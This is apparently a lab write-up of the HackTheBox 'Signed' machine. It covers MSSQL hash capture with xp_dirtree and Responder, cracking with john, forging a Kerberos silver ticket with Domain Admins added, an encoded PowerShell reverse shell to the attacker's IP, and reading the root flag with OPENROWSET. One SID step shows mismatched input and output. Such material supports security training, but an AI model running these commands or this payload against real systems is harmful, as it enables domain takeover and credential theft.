As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: scott / Sm230#C5NatH

### Nmap
```
nmap -sV -sC -vv 10.10.11.90

---OUTPUT---
Nmap scan report for 10.10.11.90
Host is up, received echo-reply ttl 127 (0.17s latency).
Scanned at 2025-12-13 17:03:52 EST for 179s
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE  REASON          VERSION
1433/tcp open  ms-sql-s syn-ack ttl 127 Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.10.11.90:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.10.11.90:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-12-12T18:22:08
| Not valid after:  2055-12-12T18:22:08
| MD5:   dc37:cc14:c9bb:5a99:80f2:10ac:097f:ef79
| SHA-1: 6086:80bb:117d:473c:d756:10e6:3bdf:5244:a571:6952
| -----BEGIN CERTIFICATE-----
| MIIEADCCAmigAwIBAgIQN+mHphdlcZ9LOAjwd7TzODANBgkqhkiG9w0BAQsFADA7
| MTkwNwYDVQQDHjAAUwBTAEwAXwBTAGUAbABmAF8AUwBpAGcAbgBlAGQAXwBGAGEA
| bABsAGIAYQBjAGswIBcNMjUxMjEyMTgyMjA4WhgPMjA1NTEyMTIxODIyMDhaMDsx
| OTA3BgNVBAMeMABTAFMATABfAFMAZQBsAGYAXwBTAGkAZwBuAGUAZABfAEYAYQBs
| AGwAYgBhAGMAazCCAaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGBAJ3MkXos
| nG3q1BR89an+vX12V/sSZpE6VgikzNqWEoM4snFHNImrskBtqZxDYUrpIZUiYiP8
| J4MCT3+ym7C9p/KpEIYsjaKYbaGjxICp0pDcyD+tkgu0i5VuaJRxWY0ke13TjMwv
| LV0+eMRJmFvysrXjJJXkfLbIVIpVkgkAWx7RLw6NYiKT0O6FyygQfonIwgeBI1vj
| mAFq3MIdNxvHsMVM6IXF/hbgKpXQIUnNRWRpxO8UF1gN9NVjgPPw9ghkTHq/Jpua
| TukxGv6Yb8vAjMLeR/TzHDfprvwoqi2WkR/4TF/ys94s10gO6GV9B/8Qj1TFVRIe
| vXt9Alyqoc9QWDOdkDnSX8meo8JVq8+PDsdCl9d7uP+yQEYn4IbU4HTW3+G9oeZk
| upeGmPOor9QNVXlKH1uE/LDulloIFYED09g32Qjx+eSybknG3YycemYIbQ0HiAgL
| 8swLXGfbASW1I5t1CimhSh2igkU3d0j2VwzQJ3fY1PEU21CUifBfyqeatQIDAQAB
| MA0GCSqGSIb3DQEBCwUAA4IBgQBtiM0pvdihsuGEKjbZnUB+NqiTssByNv34DO32
| 1AXHEmSSNbMZOEfZkdLFEaA36JyaFyd5+Ai+oVKPotoX0DVV0PI0HFsAf8Xh9dPV
| Nx/vo9QJGlxGopm2O7scOXLVQmjHbM7x5+61Vh5+eR26TGL5KQOKNBECSLU9LYwH
| puWvX1s48J6FL7dymWi+8mBBzqyGFNvylLwevqMZEmjqtSiRwOmv0xRO4ASoOPHb
| 5fpNy0dRjWN9Rg5z1xyvyTrAbtIP7L69TO3uMHYyNSP8g21b+Pg4S8BhrIXqqW0S
| EjDpwDFLzFlxFHnzqfCVws0r9IULnguRTKih20XNID52M4gznQa4DT7crdwYsNns
| nDpC+5tVbke2TIFR6PR0Is6vqNLslLeATva0zwvH9LGnfxL0v3n0COkyk3f9+iHg
| bZ4oAC4Y3itXMlh9LH4Uxuubg+azKKr59ATeU4iR4As36GyTeswTt9xQot/mcnM6
| 08xAB7VD4paB+8N+OXE7p8cPgF4=
|_-----END CERTIFICATE-----
|_ssl-date: 2025-12-13T22:06:49+00:00; +1s from scanner time.

Host script results:
|_clock-skew: mean: 1s, deviation: 0s, median: 0s
```

- I can connect via mssql:
```
impacket-mssqlclient scott@dc01.signed.htb
```
![[Pasted image 20251213171408.png]]
- I can use xpdirtree so I grabbed the hash from my responder.
![[Pasted image 20251213184314.png]]
```
xp_dirtree "\\10.10.14.21\test"


# Local machine
sudo responder -I tun0


---RELEVANT-OUTPUT---
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:2e6fec3ec5f01a6f:F6B539048A8ABC91FC04767F7EA8D394:010100000000000080C4868C536CDC0170BEAB55FB5955EC0000000002000800330030003600570001001E00570049004E002D005900500043005200510039004A0041004C0054005A0004003400570049004E002D005900500043005200510039004A0041004C0054005A002E0033003000360057002E004C004F00430041004C000300140033003000360057002E004C004F00430041004C000500140033003000360057002E004C004F00430041004C000700080080C4868C536CDC0106000400020000000800300030000000000000000000000000300000B0260833AEE1AA47F8BAC866B4BC4C8DC63B7266E36F094D086D56DC3E32E42D0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320031000000000000000000
```
![[Pasted image 20251213184400.png]]

- I can crack it with john
```
john hash --wordlist=/usr/share/wordlists/rockyou.txt

---OUTPUT---
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
purPLE9795!@     (mssqlsvc)     
1g 0:00:00:01 DONE (2025-12-13 17:19) 0.7518g/s 3373Kp/s 3373Kc/s 3373KC/s purcitititya..puppuh
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```
![[Pasted image 20251213184500.png]]

- I can login to mssql with these credentials:
```
impacket-mssqlclient mssqlsvc@dc01.signed.htb -windows-auth
```
![[Pasted image 20251213192038.png]]
- Still can't pass xp_cmdshell
- First I need to convert the cracked password to NT hash format:
```
echo -n 'purPLE9795!@' | iconv -t utf-16le | openssl md4

---OUTPUT---
MD4(stdin)= ef699384c3285c54128a3ee1ddb1a0cc
```
![[Pasted image 20251213184653.png]]

- Next we need the RID of the and the domain SID of mssqlsvc
```
SELECT SUBSTRING(SUSER_SID(),1,DATALENGTH(SUSER_SID())-4) AS DOMSID, RIGHT(CONVERT(VARBINARY(85),SUSER_SID()),4) AS RID

---OUTPUT---
                                             DOMSID   RID    
---------------------------------------------------   ----   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca4'   b'O\x04\x00\x00'
```
- Convert RID from 
```
python3 -c "print(int.from_bytes(b'O\x04\x00\x00','little'))"

--OUTPUT--
1103
```
- To convert SID, with GPT I created a hextostrong python program:
```
cat converthextosid.py 

---OUTPUT---
#!/usr/bin/env python3
import struct
import sys

if len(sys.argv) != 2:
    print(f"Usage: {sys.argv[0]} <SID_HEX>")
    print("Example:")
    print(f"  {sys.argv[0]} 0x0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000")
    sys.exit(1)

hex_sid = sys.argv[1].lower().replace("0x", "")
sid = bytes.fromhex(hex_sid)

revision = sid[0]
authority = int.from_bytes(sid[2:8], "big")
subauth_count = (len(sid) - 8) // 4
subauths = struct.unpack("<" + "I" * subauth_count, sid[8:])

print(f"S-{revision}-{authority}-" + "-".join(map(str, subauths)))
```
- I convert to get domain SID:
```
python3 converthextosid.py '0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'

---OUTPUT---
S-1-5-21-4088429403-1159899800-2753317549-1105
```
- I also need a group to change to.
- SQL command to find domain groups:
```
SELECT name, sys.fn_varbintohexstr(CONVERT(VARBINARY(85),sid)) FROM sys.server_principals WHERE type='G' AND sid IS NOT NULL

---OUTPUT---
name                                                                               
-------------------   ----------------------------------------------------------   
SIGNED\IT             0x0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000   
SIGNED\Domain Users   0x0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000
```
- I use converter to convert and find the SID of this too:
```
python3 converthextosid.py '0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000'

---OUTPUT---
S-1-5-21-4088429403-1159899800-2753317549-1105
```
- I do the same for domain users (whcih is 513):
```
python3 converthextosid.py 

---OUTPUT---'0105000000000005150000005b7bb0f398aa2245ad4a1ca401020000'
S-1-5-21-4088429403-1159899800-2753317549-513
```
- We need the value 1105.
- Now we can pass the ticketer command to get the ccache ticket of the service forgin domain admin group
```
impacket-ticketer -nthash 'ef699384c3285c54128a3ee1ddb1a0cc' \
-domain-sid 'S-1-5-21-4088429403-1159899800-2753317549' \
-domain signed.htb \
-spn mssqlsvc/dc01.signed.htb \
-groups 512,1105,513 \
-user-id 1103 mssqlsvc


---OUTPUT---
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for signed.htb/mssqlsvc
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in mssqlsvc.ccache
```
- I export the ticket and login via this ccache:
```
export KRB5CCNAME=mssqlsvc.ccache
impacket-mssqlclient -k 'signed.htb/mssqlsvc@dc01.signed.htb' -windows-auth -no-pass
```
- Now I can enable xp_cmdshell and pass a command to get a shell:
```
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
EXECUTE xp_cmdshell 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMgAxACIALAA5ADkAOQA5ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
```
![[Pasted image 20251213194232.png]]
- I grab a shell on my listener:
![[Pasted image 20251213194254.png]]
- I grab the user flag:
![[Pasted image 20251213194323.png]]

- To get root flag, looking back at my mysql login, I check if I am admin in sql (due to the forged kerberos ticket):
```
SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
1
```
- It returns 1 so we are sys admin inside sql.
- I can use OPENROWSET command which runs in the context of SQL server service which will be like having admin privileges and using that I can grab the root flag:
```
SELECT * FROM OPENROWSET(BULK N'C:\Users\Administrator\Desktop\root.txt', SINGLE_CLOB) AS t;

---OUTPUT---
BulkColumn                                
---------------------------------------   
b'6124b4723c61cb4ad51a2aecef3602af\r\n'
```
![[Pasted image 20251213210344.png]]
- I decode it via python to grab the root flag:
```
python3 -c "print(b'6124b4723c61cb4ad51a2aecef3602af\r\n'.decode())"

---OUTPUT---
6124b4723c61cb4ad51a2aecef3602af
```
![[Pasted image 20251213210313.png]]

- By using ticketer we forge our ticket by adding 512 which is the id for domain admin group, Then using this ticket to authenticate to sql gives us sysadmin privileges in sql. but if we pass xp_cmdshell is still executes under the context of mssqlsvc which allows us only to get root.
- However, due the fact that we are sysadmin, we can pass OPENROWSET command, which executes under the context of SQL Server service which is like an admin and can read the root flag. The output is in python bytes which we can decode to grab the root flag.